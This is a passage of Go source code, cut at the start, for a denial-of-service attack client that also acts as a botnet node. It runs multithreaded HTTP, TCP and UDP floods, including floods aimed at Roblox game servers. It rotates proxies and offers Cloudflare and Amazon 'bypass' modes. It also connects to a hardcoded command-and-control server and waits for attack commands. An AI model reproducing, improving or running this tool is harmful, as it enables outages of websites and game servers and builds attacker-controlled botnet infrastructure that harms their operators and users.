		fmt.Println(red("[!]") + " Attack already running")
		return
	}

	atomic.StoreInt32(&attackRunning, 1)
	defer atomic.StoreInt32(&attackRunning, 0)

	currentMethod, targetHost, targetPort = method, target, port

	// Enhanced Roblox server resolution
	if method == "ROBLOX" {
		fmt.Printf(cyan("[+]")+" Resolving Roblox game server for place ID: %s\n", target)
		ip, resolvedPort, err := resolveRobloxGameServer(target)
		if err == nil {
			targetHost, targetPort = ip, strconv.Itoa(resolvedPort)
			fmt.Printf(cyan("[+]")+" Resolved Roblox server: %s:%d\n", ip, resolvedPort)
		} else {
			fmt.Printf(red("[!]")+" Failed to resolve Roblox server: %s\n", err)
		}
	}

	// Load proxies if needed
	if useProxies {
		if err := loadAndTestProxies(proxyFile); err != nil {
			fmt.Printf(red("[!]")+" Proxy error: %v\n", err)
			return
		}
		fmt.Printf(green("[+]")+" %s ATTACK: %s:%s with %d THREADS, %d PROXIES, %ds, BYPASS:%s\n",
			method, target, port, maxThreads, len(workingProxies), duration, bypassMode)
	} else {
		fmt.Printf(green("[+]")+" %s ATTACK: %s:%s with %d THREADS, %ds, BYPASS:%s\n",
			method, target, port, maxThreads, duration, bypassMode)
	}

	// Reset counters
	atomic.StoreInt64(&requestCount, 0)
	atomic.StoreInt64(&successCount, 0)
	atomic.StoreInt64(&errorCount, 0)
	atomic.StoreInt32(&activeThreads, 0)
	atomic.StoreInt32(&stopAttackFlag, 0)

	var wg sync.WaitGroup

	// Enhanced duration handling
	if duration > 0 {
		time.AfterFunc(time.Duration(duration)*time.Second, func() {
			fmt.Printf(yellow("[!]") + " Duration reached - stopping attack\n")
			stopAttack()
		})
	}

	// Enhanced statistics with connection monitoring
	statsTicker := time.NewTicker(3 * time.Second)
	defer statsTicker.Stop()

	go func() {
		var lastRequests, lastSuccess int64
		for range statsTicker.C {
			if atomic.LoadInt32(&attackRunning) == 0 {
				return
			}

			currentRequests := atomic.LoadInt64(&requestCount)
			currentSuccess := atomic.LoadInt64(&successCount)
			active := atomic.LoadInt32(&activeThreads)

			requestsDelta := currentRequests - lastRequests
			successDelta := currentSuccess - lastSuccess

			successRate := 0.0
			if currentRequests > 0 {
				successRate = float64(currentSuccess) / float64(currentRequests) * 100
			}

			rps := requestsDelta / 3
			okRate := successDelta / 3

			fmt.Printf(cyan("[+]")+" %s: Threads=%d | RPS=%d/s | OK=%d/s | Total=%d | Success=%.1f%% | Bypass=%s\n",
				method, active, rps, okRate, currentRequests, successRate, bypassMode)

			lastRequests, lastSuccess = currentRequests, currentSuccess

			// Enhanced C2 connection monitoring
			if atomic.LoadInt32(&c2Connected) == 0 {
				fmt.Printf(yellow("[!]") + " C2 connection monitoring: RECONNECTING...\n")
			}
		}
	}()

	// Enhanced thread management
	for i := 0; i < maxThreads; i++ {
		wg.Add(1)
		atomic.AddInt32(&activeThreads, 1)

		go func(threadID int) {
			defer wg.Done()
			defer atomic.AddInt32(&activeThreads, -1)

			for atomic.LoadInt32(&attackRunning) == 1 && atomic.LoadInt32(&stopAttackFlag) == 0 {
				var proxy string
				if useProxies {
					proxy = getNextProxy()
				}

				// Enhanced method routing
				switch method {
				case "LAYER7":
					sendBypassRequest(target, proxy)
				case "TCP":
					sendTCPFlood(target, port, proxy)
				case "UDP":
					sendUDPFlood(target, port, proxy)
				case "ROBLOX":
					sendRobloxTCPFlood(target, port, proxy)
				case "ROBLOX_UDP":
					sendRobloxUDPFlood(target, port, proxy)
				default:
					sendBypassRequest(target, proxy)
				}

				// Enhanced timing with jitter
				time.Sleep(time.Duration(50+rand.Intn(100)) * time.Millisecond)
			}
		}(i)

		// Enhanced thread ramp-up
		if i%100 == 0 && i > 0 {
			time.Sleep(100 * time.Millisecond)
		}
	}

	fmt.Printf(green("[+]")+" %d %s THREADS LAUNCHED WITH BYPASS: %s\n", maxThreads, method, bypassMode)

	wg.Wait()
	fmt.Println(green("[+]") + " ATTACK COMPLETED")
}

func main() {
	var (
		proxiesFlag    = flag.String("proxies", "", "Path to proxies file")
		userAgentsFlag = flag.String("useragents", "", "Path to user agents file")
		c2Flag         = flag.String("c2", "80.200.137.242:2222", "C2 server address:port")
		target         = flag.String("target", "", "Target to attack")
		port           = flag.String("port", "443", "Target port")
		method         = flag.String("method", "LAYER7", "Attack method: LAYER7, TCP, UDP, ROBLOX, ROBLOX_UDP")
		threads        = flag.Int("threads", 1000, "Number of threads")
		duration       = flag.Int("duration", 0, "Attack duration in seconds (0 for unlimited)")
		bypass         = flag.String("bypass", "cloudflare", "Bypass mode: cloudflare, amazon, roblox")
	)
	flag.Parse()

	rand.Seed(time.Now().UnixNano())
	fmt.Println(boldPurple("[+]") + " ULTRA-STABLE L4/L7 ATTACK CLIENT - CONNECTIVITY FIXED")

	c2Server = *c2Flag
	bypassMode = *bypass

	// Start enhanced C2 connection
	go connectToC2()

	if *proxiesFlag != "" {
		useProxies = true
		proxyFile = *proxiesFlag
		fmt.Printf(green("[+]")+" Proxy support: %s\n", proxyFile)
	}

	if *userAgentsFlag != "" {
		if err := loadUserAgents(*userAgentsFlag); err != nil {
			fmt.Printf(red("[!]")+" Failed to load user agents: %v\n", err)
		}
	}

	if *target != "" {
		startUnifiedAttack(*target, *port, *method, *threads, *duration)
	} else {
		fmt.Printf(green("[+]") + " C2 connection started, waiting for commands...\n")
		fmt.Printf(green("[+]")+" Current bypass mode: %s\n", bypassMode)
		fmt.Printf(green("[+]") + " Available methods: LAYER7, TCP, UDP, ROBLOX, ROBLOX_UDP\n")

		// Keep main alive
		select {}
	}
}
